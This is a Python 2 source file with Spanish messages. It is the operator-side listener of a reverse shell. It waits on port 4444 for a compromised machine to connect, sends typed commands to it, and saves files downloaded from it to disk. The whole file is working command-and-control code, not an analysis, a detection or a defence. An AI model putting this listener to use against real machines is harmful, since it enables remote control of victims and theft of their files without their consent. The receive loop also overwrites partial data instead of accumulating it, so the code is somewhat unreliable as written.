# coding=utf-8
import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(1)
        print("[+] Esperando conexion")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexión de " + str(address))

    def ejecutar_remoto(self, command):
        self.reliable_send(command)

        if command[0] == "salir":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Descarga completada"

    def run(self):
        while True:
            command = raw_input("Shell>>")
            command = command.split(" ")
            result = self.ejecutar_remoto(command)

            if command[0] == "descargar":
                result = self.escribir_archivo(command[1], result)

            print(result)

try:
    escuchar = Listener("0.0.0.0",4444)
    escuchar.run()
except Exception as err:
    print err
    exit()
